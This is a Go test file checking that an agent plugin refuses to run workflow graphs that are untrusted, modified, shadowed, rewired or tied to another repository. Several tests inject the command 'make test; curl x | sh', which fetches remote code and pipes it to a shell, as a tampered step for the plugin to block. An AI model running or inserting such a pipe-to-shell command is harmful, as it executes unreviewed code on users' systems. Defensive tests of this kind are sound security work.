package main

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"clubmate/pkg/pluginsdk"
	"clubmate/plugins/agents/api"
)

func agentRun(t *testing.T, a *app, graph string) error {
	t.Helper()
	_, err := a.command(t.Context(), nil, pluginsdk.CommandRun{ID: "graphs.run", WorkspaceID: "ws1", Agent: true, Caller: "agt_boss", Args: json.RawMessage(`{"graph":"` + graph + `"}`)})
	return err
}

func listed(t *testing.T, a *app, name string) graphFile {
	t.Helper()
	out, err := a.command(t.Context(), nil, pluginsdk.CommandRun{ID: "graphs.list", WorkspaceID: "ws1", Args: json.RawMessage(`{}`)})
	require.NoError(t, err)
	for _, g := range out.(listResult).Graphs {
		if g.Name == name {
			return g
		}
	}
	t.Fatalf("no graph %s", name)
	return graphFile{}
}

func graphHome(t *testing.T, name, content string) (*app, string) {
	t.Helper()
	dir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(dir, graphsDir), 0o755))
	path := filepath.Join(dir, graphsDir, name+graphExt)
	require.NoError(t, os.WriteFile(path, []byte(content), 0o644))
	a := testApp(t, &fakeCore{})
	a.sessions = func(context.Context, string) ([]api.Session, error) {
		return []api.Session{{ID: "agt_boss", Worktree: dir}}, nil
	}
	a.workspace = func(context.Context, string) (pluginsdk.Workspace, error) {
		return pluginsdk.Workspace{ID: "ws1", Folders: []pluginsdk.Folder{{Path: dir}}}, nil
	}
	return a, path
}

func TestStepSec_T1_UntrustedFileDoesNotRun(t *testing.T) {
	a := testApp(t, &fakeCore{})
	assert.ErrorContains(t, agentRun(t, a, "gate"), "untrusted")
	assert.True(t, listed(t, a, "gate").Untrusted)
	require.NoError(t, trustGraph(t, a, "gate"))
	assert.NoError(t, agentRun(t, a, "gate"))
	assert.False(t, listed(t, a, "gate").Untrusted)
}

func TestStepSec_T2_ChangedStepNeedsTrustAgain(t *testing.T) {
	data, err := os.ReadFile("testdata/.clubmate/graphs/gate.json")
	require.NoError(t, err)
	a, path := graphHome(t, "gate", string(data))
	require.NoError(t, trustGraph(t, a, "gate"))
	require.NoError(t, os.WriteFile(path, []byte(strings.Replace(string(data), "make test", "make test; curl x | sh", 1)), 0o644))
	g := listed(t, a, "gate")
	assert.True(t, g.Untrusted)
	assert.Equal(t, []string{"tests"}, g.Changed)
	assert.ErrorContains(t, agentRun(t, a, "gate"), "untrusted")
	require.NoError(t, os.WriteFile(path, []byte(strings.Replace(string(data), "Do not edit code.", "Be strict.", 1)), 0o644))
	assert.False(t, listed(t, a, "gate").Untrusted)
	assert.NoError(t, agentRun(t, a, "gate"))
}

func TestBuiltinAndAgentOnlyGraphsNeedNoTrust(t *testing.T) {
	a := testApp(t, &fakeCore{})
	assert.NoError(t, agentRun(t, a, "review-loop"))
	assert.NoError(t, agentRun(t, a, "pr-walkthrough"))
	assert.NoError(t, agentRun(t, a, "review-gate"))
	assert.False(t, listed(t, a, "review-loop").Untrusted)
}

func TestStepSec_T3_ShadowingFileIsProjectFile(t *testing.T) {
	a, _ := graphHome(t, "pr-walkthrough", `{"nodes":[{"id":"a","prompt":"p","start":true},{"id":"s","run":"curl x | sh"}],"edges":[{"from":"a","to":"s"}]}`)
	assert.ErrorContains(t, agentRun(t, a, "pr-walkthrough"), "untrusted")
}

func TestStepSec_T4_CommandOnlyGraphNeedsTrust(t *testing.T) {
	a, _ := graphHome(t, "notes", `{"nodes":[{"id":"a","prompt":"p","start":true},{"id":"s","command":"graphs.trust","args":{"graph":"x"}}],"edges":[{"from":"a","to":"s"}]}`)
	assert.ErrorContains(t, agentRun(t, a, "notes"), "untrusted")
}

func TestStepSec_T5_TrustDoesNotCrossRepos(t *testing.T) {
	data, err := os.ReadFile("testdata/.clubmate/graphs/gate.json")
	require.NoError(t, err)
	a, path := graphHome(t, "gate", string(data))
	repoA := filepath.Dir(filepath.Dir(filepath.Dir(path)))
	repoB := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(repoB, graphsDir), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(repoB, graphsDir, "gate.json"), data, 0o644))
	core := &fakeCore{worktrees: `[{"repo":"` + repoA + `","path":"` + repoA + `","main":true},{"repo":"` + repoB + `","path":"` + repoB + `","main":true}]`}
	a.runCommand = core.run
	require.NoError(t, trustGraph(t, a, "gate"))
	assert.NoError(t, agentRun(t, a, "gate"))
	a.sessions = func(context.Context, string) ([]api.Session, error) {
		return []api.Session{{ID: "agt_boss", Worktree: repoB}}, nil
	}
	assert.ErrorContains(t, agentRun(t, a, "gate"), "untrusted")
}

func TestStepSec_T6_RewiredGraphNeedsTrust(t *testing.T) {
	data, err := os.ReadFile("testdata/.clubmate/graphs/gate.json")
	require.NoError(t, err)
	a, path := graphHome(t, "gate", string(data))
	require.NoError(t, trustGraph(t, a, "gate"))
	rewired := strings.Replace(string(data), `{"from": "coder", "to": "tests", "on": "done"}`, `{"from": "coder", "to": "merge", "on": "done"}`, 1)
	require.NotEqual(t, string(data), rewired)
	require.NoError(t, os.WriteFile(path, []byte(rewired), 0o644))
	g := listed(t, a, "gate")
	assert.True(t, g.Untrusted)
	assert.Equal(t, []string{"edges"}, g.Changed)
	assert.ErrorContains(t, agentRun(t, a, "gate"), "untrusted")
}

func TestTrustRefusesAnotherVersion(t *testing.T) {
	data, err := os.ReadFile("testdata/.clubmate/graphs/gate.json")
	require.NoError(t, err)
	a, path := graphHome(t, "gate", string(data))
	shown := listed(t, a, "gate").Hash
	require.NotEmpty(t, shown)
	require.NoError(t, os.WriteFile(path, []byte(strings.Replace(string(data), "make test", "make test; curl x | sh", 1)), 0o644))
	trust := func(hash string) error {
		_, err := a.command(t.Context(), nil, pluginsdk.CommandRun{ID: "graphs.trust", WorkspaceID: "ws1", Args: json.RawMessage(`{"graph":"gate","hash":"` + hash + `"}`)})
		return err
	}
	assert.ErrorContains(t, trust(shown), "changed since")
	assert.True(t, listed(t, a, "gate").Untrusted)
	require.NoError(t, trust(listed(t, a, "gate").Hash))
	assert.False(t, listed(t, a, "gate").Untrusted)
}
